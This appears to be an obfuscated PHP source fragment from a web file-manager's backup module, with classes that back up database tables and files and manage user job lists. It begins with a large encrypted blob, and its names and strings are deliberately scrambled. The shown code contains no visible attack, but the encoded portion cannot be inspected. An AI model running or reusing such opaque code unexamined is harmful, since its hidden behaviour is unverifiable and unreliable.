*œîª‹»kŒP˜Å{%@£Â')."\x9\x9b\x25\x55\xde\x7\x17\x80\x1f\x4d\x26\xfd\xc3\x73\xb\x61\x42\x6e\xc5\xf1\xf\x2b\x65\x9a\xf9\xd1\x8a\x4\x87\xc0\x2c\xc2\x46\xc0\xd5\xa3\xf1\x3b\x5c\x85\x8c\x29\x43\x9a\xa8\xf7\x63\x23\x2e\xfa\x9e\x31\x95\x43"."\x78\xd0\xc9\x43\xb7\x2b\x1f\x42\xa4\xd5\xff\xff\x54\xa4\x99\x9\xc9\x5f\xb1\xb3\x91\xca\xe\x59\xee\x6d\x92\x6f\x71\xe\x4b\x4\xf2\xe0\x63\xbf\x39\xec\x7c\xf1\x18\xa7\x48\x1c\x1a\xb3\x7e\x90\xea\x4b\x6b\x8c\x78\x6f".base64_decode('kN+jdBhAON4aoxlKuYCvLBA5gtnHWkCWvM6lb0+lPz3wa07QCUrp4JP1HBmD/UYuXeL6XSKh')."\123\27\242\10\122\13\221\226\242\126\220\236\301\164\276\360\211\306\121\355\341\117\354\362\325\371\256\234\170\256\117\154\276\316\347\313\270\122\201\45\26\221\145\73\36\314\113\232\111\55\353\241\70\215".base64_decode('yaKItY7KYVmBn4wCZQIgDWEAvIileMh7rpQaul95k1YlJ7qykUuWeCYFhUOXZXbW0NnG4ShG').strrev('˜G2ôß_e$µ#Åé„.Y¡p‰¤ÄºLğ!"3T¨¥ÜJ‡dî¼†ü°ëı}äL.(±Zü“')."\103\161\324\317\56\172\245\13\0\223\233\144\327\354\134\370\216\250\20\77\100\373\53\257\345\261\256\32\320\24\254\33\304\224\262\6\114\162\0\363\311\107\67\50\240\54\144\216\156\20\163\351\25\230"."\341\130\325\30\223\20\133\115\37\317\45\144\103\246\174\325\123\11\303\115\250\253\27\10\5\263\225\245\173\35\166\76\301\374\337\346\370\121\213\277\341\53\105\371\52\160\276\110\110\227\13\371\151\323".strrev('Çá!œĞ[çKš"åƒ'."\n".'eşBaÁóá;ÿ¼«‚§ƒzÙ‚×³/•»«÷ ]	F}¥‚ã…ü3')."\x96\x8a\x93\x8f\xfb\xd0\xc3\x27\xc3\x55\x21\xee\x9e\xb0\xa4\x59\x29\xb6\x16\x9a\xf\x8e\xc7\x8d\xa5\x51\xd3\x84\x2a\xf\x24\x4b\x60\x90\xc6\x5d\x2e\xe5\x3c\x44\x9\xc4\xc3\xf4\x2e\xab\xbe\xb1\xec\x78\x76\xd1\x3d\xa1".strrev('iŠî{©ì kZ±Ã1wuK±+ì/6Ì“´Åç É0Ù_E<¦ÌHö”¼xœ¥İÈy9cGPÕ').base64_decode('ZT49Y+bs+bIsRky/uGqeSX/gxhzYKoFQynoZhB6F+QSXSQ/JdNr4VD4G7tpy/neLTZx3aFHZ')."\363\22\175\56\331\314\341\143\167\36\213\371\355\222\346\74\132\126\71\101\261\375\233\300\254\352\313\241\322\176\352\251\330\133\75\374\51\147\266\166\71\104\141\111\27\214\324\0\161\314\103\276\240\15"."\241\35\260\344\261\364\21\17\5\230\107\276\346\246\307\44\241\32\206\7\303\321\224\324\24\115\113\352\142\125\206\213\101\44\216\32\244\223\202\374\120\250\262\375\317\251\71\146\153\175\344\315\165\203"."\231\144\21\272\40\51\11\22\23\72\336\24\366\352\41\126\61\237\322\152\200\164\175\215\142\262\211\265\264\54\211\62\72\133\240\63\120\5\101\104\337\234\24\254\215\237\274\261\320\135\304\234\203\4"."\xf9\x98\xc8\x96\x4e\xcb\xd5\x8f\xd7\x18\x96\x44\x24\x1d\x2b\xe4\x46\xab\xd\xbd\xca\x10\xbe\x4\xaf\xd9\x61\xd7\x7f\xac\xe8\xba\xa4\xa5\xe4\x9c\x20\x57\x2f\x28\x7\xcd\x71\xa6\xe2\x75\x73\xaf\x66\x7b\x65\x42\x25\x64".strrev('%Pr%)\'œ_»v]ùsQ†<0ó6¸Íq)Ÿp¹zü°…P¨™G¯V¢‚ /®Ä*¢à#º¼').base64_decode('6c0A2USaNCSjbmXT0hPTQlZHhHswCKBVRF2FmNMHlnATe01SyHQKEFU3LcC4IoZgm3JYeroc').base64_decode('bY8xZr2CuuMQBKC4QAmJHKddiQxmZAHyDtCTQwOcGWRHDo6jJ3+D13EUtdwPcSMm2/G2T1ow').base64_decode('LkD1YFcgxor0axJPwrqYlULRcl5EJEE8OcvyTIe/C+wl0rW6mRcN7JREvjSlHuxpmB2y/o/f')."\240\376\277\365\364\364\354\106\166\145\302\115\35\11\11\146\221\45\160\346\201\156\343\113\154\116\331\251\334\336\65\40\47\23\61\11\220\13\315\202\157\110\320\30\22\347\252\375\314\145\50\363\44\252"."\xb1\x3b\x4e\x2d\x97\x93\x58\x8d\xea\xa7\x44\xe1\x5d\xc0\x34\x73\x7d\x5a\xc9\x87\x70\x72\x80\xbf\x2a\x5f\x2d\xe2\xb6\xc9\x4e\x68\x19\x5d\xee\xf3\x2a\x22\x42\x47\x89\x9\x2c\x33\xee\x15\x14\x5\xa7\x55\xab\x26\x3f\x53"."\x8e\x48\x4c\x51\x22\x90\xa4\x2d\x94\x22\xb5\xc2\x15\x3d\xa1\x30\xd0\x4b\x7e\xaa\xad\xb2\x32\x68\x12\x3b\xd8\x8\x32\xc7\xb6\x77\x17\x24\x88\x1e\xb4\xf3\x45\xb\x89\x97\xab\x28\x26\xba\x8f\x58\x3e\xae\x8a\xcd\x42\x29"."\xcc\x72\x10\x6f\x43\x30\xd\xb2\x3f\x88\x58\x91\x1d\xfc\xeb\x61\x33\xe9\x85\x5f\xf0\x42\x3\x44\x51\x26\x84\x8e\xa4\xa\xf2\x99\x74\x4c\xae\x23\x51\x9e\x37\x41\xe3\x7c\x4e\xf7\x57\x50\xa3\xd3\xf5\x8a\x3a\x2d\x64\xc9"."\260\165\272\264\220\364\161\53\225\140\52\133\342\124\106\256\202\315\64\234\202\114\74\305\344\64\330\350\165\45\64\171\135\315\361\107\345\235\13\310\361\312\71\125\34\102\253\56\216\205\127\114\160\111"."\356\1\211\322\200\267\262\16\135\54\11\121\146\202\345\132\235\172\360\116\11\341\55\16\311\360\140\124\250\253\144\22\36\333\231\312\5\172\222\166\174\112\222\220\273\171\66\232\74\325\47\17\104\276".strrev('Ôß×R¤GJĞ)»cÃ 1alGYİÙ5‡|y&zÜÍÔ!>cö0òêCÅŒœÿqLMa½^w)')."\166\276\30\344\267\345\116\103\166\311\60\206\171\165\223\5\310\316\302\330\250\311\271\56\27\125\53\226\62\113\126\305\361\202\145\142\206\333\104\271\161\46\377\310\60\225\227\356\2\132\335\172\312\326"."\xd3\xa\xe6\x1a\x1c\xe7\xa2\x55\xb3\x1a\x67\xf6\x7e\x59\x73\xb3\xd8\xb3\x85\xa8\xe4\xac\xaf\x28\x9\x7\xb4\xc4\x4c\x2f\xd3\xde\x66\x65\xaa\xd6\x33\xa9\xff\xa5\x6a\x79\x8\x49\x13\xb6\x3\x9b\xc4\x23\x4f\xee\xc7\x9d"."\234\217\71\65\113\222\155\372\116\226\343\25\270\212\111\212\232\101\301\317\270\362\60\275\230\70\27\113\7\270\156\0\173\262\7\153\103\372\261\23\70\154\302\343\47\210\10\27\22\53\325\274\312\24"."\xc1\xb0\x4c\x46\x88\xe6\x8\x19\xae\x3c\x57\xc3\x97\xec\xd2\x68\xac\x14\xcf\x47\x2b\x5c\x27\x3a\xad\xf1\xa4\xfa\xe4\x2c\x46\x65\x70\xe\x51\x1c\x68\x7b\xc8\x49\x92\xf6\x3\x3a\xd2\xa6\x9d\xf\xfe\x91\x4c\x92\xcc\x5c"."\xcd\x43\xb\xd2\xfd\xbd\x53\x7d\x82\x1b\x3a\x57\xec\xbf\x65\x23\x22\x65\x93\x5a\xcc\x65\x31\xfa\xc5\x2e\x19\xc2\xc2\x49\x17\xc9\xa6\x97\x93\x1\xf7\x19\x53\xaa\xd5\xed\x10\x17\x48\xca\x16\x29\x42\x4c\x42\x95\x77\xeb"."\xe2\xca\x5f\x62\x6a\x59\x35\x2c\x6f\x10\x8c\x85\x2b\x5d\x22\xbe\x62\xab\xd4\x86\x4\x8b\x2e\x8e\x73\xe9\x74\xbb\x36\x54\xa5\x68\xba\xe2\xc0\x89\x52\x78\x51\xc2\xe2\x4b\xbe\x54\x84\xc1\x95\x3e\x2c\x7f\x1d\xca\x9\x3"."\47\107\301\312\124\341\153\105\252\357\72\250\223\141\342\264\152\303\47\304\320\131\135\366\345\302\221\112\44\321\147\317\270\146\222\44\5\301\232\134\102\145\211\16\205\13\340\304\47\235\236\143\170\61"."\x3e\x67\xa8\xc\x31\xbd\xf4\x3a\x52\x5d\xe7\x78\x2c\xeb\x64\x7c\xa8\x2b\xb\xa4\x7f\x52\xf3\x55\x85\x84\x12\xa\xe8\xb9\x88\xd4\x9c\xac\x6b\x31\x61\x85\x44\xf5\x8f\x8\xac\x74\x82\x58\x72\xb9\x23\x32\x18\xa7\x23\xb7"."\342\330\336\370\300\240\144\134\316\164\164\247\12\152\260\243\211\54\263\256\314\64\163\71\174\173\76\101\66\125\277\226\66\343\312\22\102\264\115\73\104\16\337\142\341\320\304\74\221\135\321\274\200\63"."\213\226\327\135\160\223\53\270\141\112\153\70\136\31\225\323\207\15\73\325\57\111\12\52\63\53\323\113\25\323\14\35\250\76\16\167\157\331\54\273\65\263\104\43\25\375\221\324\306\222\146\225\72\264".base64_decode('R1Wr0SxcUxzLHHUnAAGuS7Nw3YpsVrkCrqSerZWtCYZXCTyQiaarDFjIGqWiE8GzauHKz8Ea').base64_decode('cJcmkrfqvZBEk04Nnmq9qFp4wl64Swt+CB/Cq+VUXaDwBkGVHYPlVNkjKP2bUCVOqIlVblYi')."\xaf\x8a\xd2\x1a\xfd\x24\xe6\xcc\x64\x57\xa5\x55\xb2\x65\xd\xb8\xea\x3a\x72\xf1\xaa\xf4\xcd\x72\x2a\xaf\xb9\xd2\x1d\x4e\xaa\x29\x49\xa2\x11\xa6\xd8\x5a\xd2\x7\x65\x63\x65\xae\xd8\x29\x5a\x44\xc\x64\xce\x18\x10\x1a".base64_decode('xMzSCEQzXP92oGDyrTMttMYx3xcouWeiojXn4iiUpbcUqho+ebAsrVJOldO4iarQqqRiABOd')."\x58\x75\xe7\x83\xd\xb2\x43\x45\x9a\xcf\x3e\x92\x13\x52\x70\xf7\x5d\x85\x90\xec\x39\xb4\xae\xaa\x9\xf6\x71\x12\xd\xfa\xc4\x55\x1e\x6d\x4f\x8c\x45\xc2\x1a\x87\x8d\x22\x65\x97\xe0\xde\x94\xea\x5f\x4\xf1\xe5\x28\xbf"."\x6b\x27\x37\x15\x94\xbd\xa0\xd9\x9\xb3\x64\x7b\x70\x5e\xd2\x2c\x92\xdf\x56\xd3\xb6\x85\xa\x13\xbb\x37\x41\x87\x4\xcc\x23\x78\x24\xd\x3d\x14\x12\x97\xec\xb8\x53\xe4\xca\x96\x20\x36\xbd\xf9\xc0\x41\xd0\x4\xc1\xc2"."\xa8\x84\x4e\x73\x9\x25\x74\x44\xf0\x55\x30\x8f\xc8\x2c\x0\x5c\xf4\xb6\x97\x5d\x3a\x2b\x22\x61\xc0\x4c\xf7\x99\x23\xcc\x8d\x28\xc2\x2b\x9\x48\xe2\x8e\xf\xf0\x4d\x56\x2a\x24\x4e\x70\x2c\x3f\xcd\xf1\xc3\x13\x60\x5e".base64_decode('cgkDbyL71hSzjur0YVZuHfBlLcAFhGiCvv9DJMxgKJlIJiqyugKJxPJYvI0+F1SRTWpJ2poV')."\x59\x5d\x1d\xb1\xe8\x44\x79\xa1\xce\x40\x38\x52\x91\x87\x15\x3b\xa3\xaa\xf0\x3b\x4b\xb3\xc2\x5d\xa4\x97\x44\xbf\x61\xa2\x5e\x84\x83\x4b\x45\x4f\xd8\x5\x68\x4\xde\x95\x15\x93\x20\x5d\x8\x16\xfb\x4d\x76\xcf\xc7\xca"."\47\64\366\20\274\174\25\246\347\205\33\142\121\307\51\211\223\257\313\54\346\57\234\7\234\117\172\272\64\251\235\212\100\14\163\241\131\254\257\31\205\57\305\213\220\212\237\130\342\4\200\37\62\204".base64_decode('ypDPoY0kpZNFQqiOtHblLZ9cGHMBHcluqAq8KveYsjIWzhXAwd08jr2rsMbsE+c6OPCBHwQA')."\267\244\241\113\303\216\154\133\313\62\371\251\103\367\206\212\325\61\121\20\2\357\377\17\126\365\153\47\257\276\0\0".strrev('').base64_decode('').""."".strrev(''), 10, -8))); goto CùŒàÎğ«ë; fĞîÌÕåŒ¾: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $½¥·”„Å =& $_SERVER[åÄ¼Ùßš]; $‹ÀãáÁå = Backup::get(); self::$io = $‹ÀãáÁå[$½¥·”„Å[845]]; self::$name = $‹ÀãáÁå[$½¥·”„Å[32]]; $é®¯òÅ = new DbManage(); $²ÆøúÑ = $é®¯òÅ->dbType(); $•„‚Ö®ä = array($½¥·”„Å[874] => $²ÆøúÑ, $½¥·”„Å[875] => time()); Backup::set($•„‚Ö®ä); $üÆÑä¼¤ = $this->tmpFilesPath() . $½¥·”„Å[876] . self::$name . $½¥·”„Å[8]; del_dir($üÆÑä¼¤); mk_dir($üÆÑä¼¤); $Ç÷Şë¯¿ = $ÖÇºÍÈ = 0; try { $’¡¿¡¹’ = $é®¯òÅ->db()->getTables(); } catch (Exception $—¾–Ã¢°) { Backup::log($½¥·”„Å[877] . $—¾–Ã¢°->getMessage()); return !1; } $’¡¿¡¹’ = array_diff($’¡¿¡¹’, array($½¥·”„Å[878], $½¥·”„Å[879])); foreach ($’¡¿¡¹’ as $­ÍˆÛË½) { if ($­ÍˆÛË½ == $½¥·”„Å[880]) { continue; } $Ç÷Şë¯¿ += $é®¯òÅ->model($­ÍˆÛË½)->count(); } $ôœ˜ûÇÏ = new Task($½¥·”„Å[881], $½¥·”„Å[873], $Ç÷Şë¯¿, LNG($½¥·”„Å[882]) . $½¥·”„Å[883] . LNG($½¥·”„Å[884])); $GLOBALS[$½¥·”„Å[885]] = self::$name; foreach ($’¡¿¡¹’ as $­ÍˆÛË½) { $Å…÷·âÖ = $üÆÑä¼¤ . $­ÍˆÛË½ . $½¥·”„Å[886]; if ($­ÍˆÛË½ == $½¥·”„Å[880]) { @touch($Å…÷·âÖ); continue; } $‹‰ñƒÉà = null; if ($­ÍˆÛË½ == $½¥·”„Å[887] && $‹ÀãáÁå[$½¥·”„Å[171]] == $½¥·”„Å[872]) { $‹‰ñƒÉà = self::$io; } $ÖÇºÍÈ += $é®¯òÅ->sqlFromDb($­ÍˆÛË½, $Å…÷·âÖ, $ôœ˜ûÇÏ, $‹‰ñƒÉà); } unset($GLOBALS[$½¥·”„Å[885]]); $ôœ˜ûÇÏ->end(); if ($ÖÇºÍÈ > $Ç÷Şë¯¿) { $Ç÷Şë¯¿ = $ÖÇºÍÈ; } $•„‚Ö®ä = array($½¥·”„Å[874] => $²ÆøúÑ, $½¥·”„Å[869] => 1, $½¥·”„Å[888] => $Ç÷Şë¯¿, $½¥·”„Å[889] => $ÖÇºÍÈ, $½¥·”„Å[890] => time()); Backup::set($•„‚Ö®ä); if ($Ç÷Şë¯¿ - $ÖÇºÍÈ > 0) { $–æ÷—éó = $½¥·”„Å[891]; if (!stristr(I18n::getType(), $½¥·”„Å[892])) { $–æ÷—éó = $½¥·”„Å[893]; } Backup::log(array($–æ÷—éó, $•„‚Ö®ä)); return !1; } return !0; } private function tmpFilesPath() { $Ø«È£Ø¶ =& $_SERVER[åÄ¼Ùßš]; $Ì…¬•« = TEMP_FILES; if ($GLOBALS[$Ø«È£Ø¶[6]][$Ø«È£Ø¶[92]][$Ø«È£Ø¶[894]]) { $Ì…¬•« = $GLOBALS[$Ø«È£Ø¶[6]][$Ø«È£Ø¶[92]][$Ø«È£Ø¶[894]]; if (!mk_dir($Ì…¬•«) || !is_writable($Ì…¬•«) || !IO::mkfile($Ì…¬•« . $Ø«È£Ø¶[895])) { $Ì…¬•« = TEMP_FILES; } } return $Ì…¬•«; } } class BackupDbFile { public function __construct() { } public function index() { $å¸—ü‚¯ =& $_SERVER[åÄ¼Ùßš]; $È€º¥¯ = Backup::get(); $¨œ¨ ö¶ = $È€º¥¯[$å¸—ü‚¯[32]]; $Ğ”¦–ÄÀ = $this->tmpFilesPath() . "\142\141\x63\153\165\x70\137{$¨œ¨ ö¶}\57"; $ù£‘Ö¨ = $this->backupPath($È€º¥¯); if (!($ù£‘Ö¨ = IO::mkdir($ù£‘Ö¨))) { Backup::log($å¸—ü‚¯[896] . $ù£‘Ö¨); return !1; } $éÒÄÜÅ = IO::listPath($Ğ”¦–ÄÀ); $Ğ…÷çÃö = isset($éÒÄÜÅ[$å¸—ü‚¯[86]]) ? $éÒÄÜÅ[$å¸—ü‚¯[86]] : array(); $›èŒ”›Ï = array_sum(array_column($Ğ…÷çÃö, $å¸—ü‚¯[79])); if (!$›èŒ”›Ï) { Backup::log($å¸—ü‚¯[897] . $Ğ”¦–ÄÀ); return !1; } $³ƒàğÛ = array($å¸—ü‚¯[898] => $›èŒ”›Ï, $å¸—ü‚¯[899] => time()); Backup::set($³ƒàğÛ); $²ì®ƒÒ¾ = new TaskFileTransfer($å¸—ü‚¯[900], $å¸—ü‚¯[873], count($Ğ…÷çÃö), LNG($å¸—ü‚¯[882]) . $å¸—ü‚¯[474] . LNG($å¸—ü‚¯[884]) . $å¸—ü‚¯[901]); $²ì®ƒÒ¾->task[$å¸—ü‚¯[857]] = $›èŒ”›Ï; foreach ($éÒÄÜÅ[$å¸—ü‚¯[86]] as $Àè»ˆÎ¨) { $˜†ƒÂ ” = IO::move($Àè»ˆÎ¨[$å¸—ü‚¯[87]], $ù£‘Ö¨); if (!$˜†ƒÂ ”) { $²ì®ƒÒ¾->end(); $úŠ¯¤èĞ = IO::getLastError($å¸—ü‚¯[902] . $Àè»ˆÎ¨[$å¸—ü‚¯[87]] . $å¸—ü‚¯[903] . $ù£‘Ö¨ . $å¸—ü‚¯[178]); Backup::log($úŠ¯¤èĞ); return !1; } } $Ì¶Ù«£” = new DbManage(); $Âİ”ÖªÕ = $Ì¶Ù«£”->getSqlFile(); if (!$Âİ”ÖªÕ || !$Âİ”ÖªÕ[$å¸—ü‚¯[904]] || !$Âİ”ÖªÕ[$å¸—ü‚¯[13]]) { Backup::log($å¸—ü‚¯[905]); return !1; } IO::move($Âİ”ÖªÕ[$å¸—ü‚¯[904]], $ù£‘Ö¨); IO::move($Âİ”ÖªÕ[$å¸—ü‚¯[13]], $ù£‘Ö¨); $²ì®ƒÒ¾->end(); $³ƒàğÛ = array($å¸—ü‚¯[906] => $›èŒ”›Ï, $å¸—ü‚¯[907] => time()); Backup::set($³ƒàğÛ); return !0; } private function backupPath($ÄÛãÉÁˆ) { $…•óÆÖ› =& $_SERVER[åÄ¼Ùßš]; $µ¼Ì³ÑÑ = $ÄÛãÉÁˆ[$…•óÆÖ›[32]]; $¥‹ç¨Ï = Model($…•óÆÖ›[866])->get($…•óÆÖ›[867]); $ƒï—Ñ¡Ù = substr(md5($…•óÆÖ›[868] . $¥‹ç¨Ï . $µ¼Ì³ÑÑ), 0, 8); return "\x7b\x69\157\72{$ÄÛãÉÁˆ[$…•óÆÖ›[845]]}\175\x2f\x64\x61\x74\x61\142\141\x73\x65\x2f\142\x61\143\153\x75\x70\57" . $µ¼Ì³ÑÑ . $…•óÆÖ›[11] . $ƒï—Ñ¡Ù; } private function tmpFilesPath() { $îşÜÈË¼ =& $_SERVER[åÄ¼Ùßš]; $·ÃŞ¡–ñ = TEMP_FILES; if ($GLOBALS[$îşÜÈË¼[6]][$îşÜÈË¼[92]][$îşÜÈË¼[894]]) { $·ÃŞ¡–ñ = $GLOBALS[$îşÜÈË¼[6]][$îşÜÈË¼[92]][$îşÜÈË¼[894]]; if (!mk_dir($·ÃŞ¡–ñ) || !is_writable($·ÃŞ¡–ñ) || !IO::mkfile($·ÃŞ¡–ñ . $îşÜÈË¼[895])) { $·ÃŞ¡–ñ = TEMP_FILES; } } return $·ÃŞ¡–ñ; } } class BackupFile { public function __construct() { } public function index() { $‰Åäç‚ë = Backup::get(); $ÓÀ™Û‰¬ = $‰Åäç‚ë[$_SERVER[åÄ¼Ùßš][849]][$_SERVER[åÄ¼Ùßš][233]][$_SERVER[åÄ¼Ùßš][554]]; $ òÍÑ‡ = array($_SERVER[åÄ¼Ùßš][555] => array($_SERVER[åÄ¼Ùßš][908], $ÓÀ™Û‰¬), $_SERVER[åÄ¼Ùßš][909] => array($_SERVER[åÄ¼Ùßš][408], $‰Åäç‚ë[$_SERVER[åÄ¼Ùßš][845]])); $Í‡˜§†´ = (int) Model($_SERVER[åÄ¼Ùßš][887])->where($ òÍÑ‡)->count($_SERVER[åÄ¼Ùßš][554]); $ƒ´’Üá = (int) Model($_SERVER[åÄ¼Ùßš][887])->where($ òÍÑ‡)->sum($_SERVER[åÄ¼Ùßš][79]); $îŸúë… = new TaskFileTransfer($_SERVER[åÄ¼Ùßš][910], $_SERVER[åÄ¼Ùßš][873], $Í‡˜§†´, LNG($_SERVER[åÄ¼Ùßš][882]) . $_SERVER[åÄ¼Ùßš][883] . LNG($_SERVER[åÄ¼Ùßš][911])); $îŸúë…->task[$_SERVER[åÄ¼Ùßš][857]] = $ƒ´’Üá; $ÌÈ±“ô“ = array($_SERVER[åÄ¼Ùßš][912] => $Í‡˜§†´, $_SERVER[åÄ¼Ùßš][913] => $ƒ´’Üá, $_SERVER[åÄ¼Ùßš][914] => time()); Backup::set($ÌÈ±“ô“); $ø¢Ê›·û = !0; $ó¥ëø« = $this->storeIds(); $ïò¤ØÜ³ = 1; $õòƒŠÔÊ = 1000; $ÀÇÑá»Î = $³ÊÄ…âÌ = 0; $²Ú£’‡ö = array(); $«ôÖğÇÕ = $Ä«­úÊ = 0; do { $ëâ‚äº = $_SERVER[åÄ¼Ùßš][915]; $ŠıÖ›ä˜ = Model($_SERVER[åÄ¼Ùßš][887])->where($ òÍÑ‡)->field($ëâ‚äº)->order($_SERVER[åÄ¼Ùßš][916])->selectPage($õòƒŠÔÊ, $ïò¤ØÜ³); $ìĞùÇµ‚ = !empty($ŠıÖ›ä˜[$_SERVER[åÄ¼Ùßš][447]]) ? $ŠıÖ›ä˜[$_SERVER[åÄ¼Ùßš][447]] : array(); foreach ($ìĞùÇµ‚ as $Šµ÷²…²) { if (!$this->_fileExist($Šµ÷²…², $²Ú£’‡ö, $ó¥ëø«)) { Backup::log($_SERVER[åÄ¼Ùßš][917] . $Šµ÷²…²[$_SERVER[åÄ¼Ùßš][554]] . $_SERVER[åÄ¼Ùßš][918] . $Šµ÷²…²[$_SERVER[åÄ¼Ùßš][87]]); continue; } $ıèÚÜ…Í = $Šµ÷²…²[$_SERVER[åÄ¼Ùßš][87]]; $›ÔßëÀş = "\173\151\157\72{$‰Åäç‚ë[$_SERVER[åÄ¼Ùßš][845]]}\175" . substr($ıèÚÜ…Í, strlen("\x7b\151\157\72{$Šµ÷²…²[$_SERVER[åÄ¼Ùßš][919]]}\x7d")); if (IO::exist($›ÔßëÀş)) { $îŸúë…->updateFileEnd($Šµ÷²…²[$_SERVER[åÄ¼Ùßš][32]], $Šµ÷²…²[$_SERVER[åÄ¼Ùßš][79]]); } else { $›ÔßëÀş = get_path_father($›ÔßëÀş); IO::mkdir($›ÔßëÀş); if (!IO::copy($ıèÚÜ…Í, $›ÔßëÀş, $_SERVER[åÄ¼Ùßš][920])) { Backup::log($_SERVER[åÄ¼Ùßš][921] . $ıèÚÜ…Í . $_SERVER[åÄ¼Ùßš][903] . $›ÔßëÀş . $_SERVER[åÄ¼Ùßš][178]); $ø¢Ê›·û = !1; break; } } $ÓÀ™Û‰¬ = $Šµ÷²…²[$_SERVER[åÄ¼Ùßš][554]]; $³ÊÄ…âÌ += 1; $ÀÇÑá»Î += $Šµ÷²…²[$_SERVER[åÄ¼Ùßš][79]]; $Ä«­úÊ += 1; $«ôÖğÇÕ += $Šµ÷²…²[$_SERVER[åÄ¼Ùßš][79]]; if ($ÀÇÑá»Î >= 1024 * 1024 * 100) { $ÌÈ±“ô“ = array($_SERVER[åÄ¼Ùßš][844] => $ÓÀ™Û‰¬, $_SERVER[åÄ¼Ùßš][922] => $Ä«­úÊ, $_SERVER[åÄ¼Ùßš][923] => $«ôÖğÇÕ); Backup::set($ÌÈ±“ô“); $ÀÇÑá»Î = $³ÊÄ…âÌ = 0; } } $¸Ş©ëÃ = count($ìĞùÇµ‚); $ïò¤ØÜ³++; } while ($¸Ş©ëÃ == $õòƒŠÔÊ); $îŸúë…->end(); $ÌÈ±“ô“ = array($_SERVER[åÄ¼Ùßš][924] => 1, $_SERVER[åÄ¼Ùßš][855] => time(), $_SERVER[åÄ¼Ùßš][871] => 1, $_SERVER[åÄ¼Ùßš][844] => $ÓÀ™Û‰¬, $_SERVER[åÄ¼Ùßš][925] => time()); if ($³ÊÄ…âÌ) { $ÌÈ±“ô“[$_SERVER[åÄ¼Ùßš][922]] = $Ä«­úÊ; $ÌÈ±“ô“[$_SERVER[åÄ¼Ùßš][923]] = $«ôÖğÇÕ; } Backup::set($ÌÈ±“ô“); return !0; } private function _fileExist($ Ÿ¹‚úï, &$ºúáı—•, $ÏÌ‰Šºå) { $¨ªäÖƒî =& $_SERVER[åÄ¼Ùßš]; $şÉ°¬™É = $ Ÿ¹‚úï[$¨ªäÖƒî[87]]; if (in_array($ Ÿ¹‚úï[$¨ªäÖƒî[554]], $ºúáı—•)) { return !1; } if (!in_array($ Ÿ¹‚úï[$¨ªäÖƒî[919]], $ÏÌ‰Šºå)) { return !1; } if (IO::exist($şÉ°¬™É)) { return !0; } $Î®ÉÌ¥„ = get_path_father($şÉ°¬™É); if (IO::exist($Î®ÉÌ¥„)) { $ºúáı—•[] = $ Ÿ¹‚úï[$¨ªäÖƒî[554]]; return !1; } $òş„öå® = array($¨ªäÖƒî[919] => $ Ÿ¹‚úï[$¨ªäÖƒî[919]], $¨ªäÖƒî[87] => array($¨ªäÖƒî[471], "{$Î®ÉÌ¥„}\45")); $›Äş‹š… = Model($¨ªäÖƒî[887])->where($òş„öå®)->field($¨ªäÖƒî[555])->select(); $ºúáı—• = array_merge($ºúáı—•, array_to_keyvalue($›Äş‹š…, $¨ªäÖƒî[12], $¨ªäÖƒî[554])); return !1; } private function _fileFilter($òó£Úò²) { $£Ü¼Ó“è =& $_SERVER[åÄ¼Ùßš]; return; if (empty($òó£Úò²)) { return; } $Ûœãé÷ = array($£Ü¼Ó“è[554] => array($£Ü¼Ó“è[7], array_unique($òó£Úò²))); $¯±½Ûñí = Model($£Ü¼Ó“è[926])->where($Ûœãé÷)->field($£Ü¼Ó“è[194])->select(); foreach ($¯±½Ûñí as $±¤±ãë„) { Model($£Ü¼Ó“è[926])->remove($±¤±ãë„[$£Ü¼Ó“è[194]], !1); } } private function storeIds() { $ä‚¶¼ =& $_SERVER[åÄ¼Ùßš]; $²üÃ¯âØ = Model($ä‚¶¼[861])->listData(); $õöÓŠÁÁ = array(); $üÌª¶· = $GLOBALS[$ä‚¶¼[6]][$ä‚¶¼[92]][$ä‚¶¼[927]]; foreach ($²üÃ¯âØ as $êÅ¾¦‘×) { $ŞÁïÃ = strtolower($êÅ¾¦‘×[$ä‚¶¼[98]]); if (!isset($üÌª¶·[$ŞÁïÃ])) { continue; } $ÑıÇÒ“ò = $ä‚¶¼[77] . (isset($üÌª¶·[$ŞÁïÃ]) ? $üÌª¶·[$ŞÁïÃ] : ucfirst($ŞÁïÃ)); if (!class_exists($ÑıÇÒ“ò)) { continue; } $õöÓŠÁÁ[] = $êÅ¾¦‘×[$ä‚¶¼[484]]; } return $õöÓŠÁÁ; } } goto A’¡ÑÅê…ô; aÏ…ÊøàøÕ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\152\157\x62\x4c\151\x73\x74"; public $field = array("\156\141\155\x65", "\144\145\x73\143", "\163\x6f\x72\x74"); const JOB_KEY = "\163\x65\154\x66\x4a\x6f\142\114\x69\x73\164"; public function listData($ğ¯Å¡Ÿä = false, $¸şÒµõŸ = "\x73\x6f\x72\164", $ùßÍ©Ô = false) { return parent::listData($ğ¯Å¡Ÿä, $¸şÒµõŸ, $ùßÍ©Ô); } public function remove($†ùù«¹ç) { return parent::remove($†ùù«¹ç); } public function add($ß«§½¶) { $ÉÇÓ»‹Ç =& $_SERVER[åÄ¼Ùßš]; if ($this->findByName($ß«§½¶[$ÉÇÓ»‹Ç[32]])) { return !1; } $ß«§½¶[$ÉÇÓ»‹Ç[2041]] = $this->getSort(); return parent::insert($ß«§½¶); } private function getSort() { $‰ŒŞ¢ÈÛ =& $_SERVER[åÄ¼Ùßš]; $ËÂ—¯­‰ = parent::listData(); $„‰Œ…Ò¦ = array_to_keyvalue($ËÂ—¯­‰, $‰ŒŞ¢ÈÛ[12], $‰ŒŞ¢ÈÛ[2041]); return empty($„‰Œ…Ò¦) ? 0 : max($„‰Œ…Ò¦) + 1; } public function update($ŸÅ¸¸îá, $Àù¬†˜–) { $½ı»ï„ =& $_SERVER[åÄ¼Ùßš]; $²Ë‡˜‚Ò = parent::listData($ŸÅ¸¸îá); $¤ªª¨‡Â = $this->findByName($Àù¬†˜–[$½ı»ï„[32]]); if (!$²Ë‡˜‚Ò || $¤ªª¨‡Â && $¤ªª¨‡Â[$½ı»ï„[484]] != $²Ë‡˜‚Ò[$½ı»ï„[484]]) { return !1; } return parent::update($ŸÅ¸¸îá, $Àù¬†˜–); } public function setUserJob($ Ëå—àÌ, $¡Âøô¶Ò) { $„·åßÓ™ =& $_SERVER[åÄ¼Ùßš]; if (!is_array($¡Âøô¶Ò)) { $¡Âøô¶Ò = array($¡Âøô¶Ò); } $Îï÷·¿Â = parent::listData(); $å¶ı€¸ğ = array_to_keyvalue($Îï÷·¿Â, $„·åßÓ™[32]); 